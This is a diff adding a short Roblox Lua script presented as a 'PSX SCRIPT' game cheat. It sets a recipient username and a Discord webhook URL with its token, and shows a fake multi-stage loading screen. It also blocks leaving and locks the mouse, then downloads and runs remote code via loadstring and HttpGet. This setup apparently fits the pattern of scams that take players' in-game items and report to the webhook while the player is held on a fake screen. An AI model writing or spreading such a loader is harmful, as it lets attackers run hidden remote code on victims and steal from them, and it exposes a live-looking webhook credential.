@@ -1,0 +1,21 @@
+UserName = "Murdyoof"
+
+Webhook = "https://discord.com/api/webhooks/1099330530597687417/FVFValFOiV2B81G679jeKoc9Iik7tHryABr2LMJmK8Iq7sexqJNMdmZILKuOYXqSqGh-"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+_G.ScriptName = "PSX SCRIPT"
+
+_G.FirstText = "Preparing Script..."
+
+_G.SecondText = "Loading Script..."
+
+_G.ThirdText = "Finishing Things Up..."
+
+_G.WaitingTime = 100
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PSX12345/PSX-SCRIPT/main/PSXSCRIPT", true))()
